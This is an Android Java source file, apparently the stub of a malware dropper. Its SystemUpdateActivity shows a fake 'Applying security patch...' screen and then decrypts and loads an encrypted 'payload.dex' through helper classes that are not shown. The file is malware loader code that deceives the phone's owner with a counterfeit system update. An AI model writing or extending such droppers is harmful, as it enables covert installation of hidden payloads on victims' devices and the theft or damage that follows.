package com.thanex.stub;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;
import android.widget.ProgressBar;

public class SystemUpdateActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_system_update);

        TextView tv = findViewById(R.id.update_text);
        ProgressBar pb = findViewById(R.id.update_progress);
        tv.setText("Applying security patch...");
        pb.setIndeterminate(true);

        new Handler().postDelayed(() -> {
            DexDecryptor.decrypt(this, "payload.dex", "YOUR_AES_KEY");
            PayloadExecutor.load(this);
        }, 2000);
    }
}
